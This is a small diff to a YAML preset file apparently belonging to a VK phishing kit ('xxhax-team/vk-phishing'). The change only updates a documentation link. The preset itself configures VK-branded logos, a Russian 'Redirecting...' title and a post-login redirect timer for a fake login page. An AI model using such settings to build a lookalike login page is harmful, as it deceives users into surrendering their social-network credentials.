@@ -3,7 +3,7 @@ presets:
   example:
     afterLoginTitle: Перенаправление...
     afterLoginImage: https://brand.vkforms.ru/static/media/logo_color_198.231228dd.svg
-    afterLoginUrl: https://github.com/xxhax-team/vk-phishing/docs/
+    afterLoginUrl: https://github.com/xxhax-team/vk-phishing/blob/master/docs/ru.md
     afterLoginRedirTime: 5
 
     beforeLoginImage: https://brand.vkforms.ru/static/media/logo_color_198.231228dd.svg
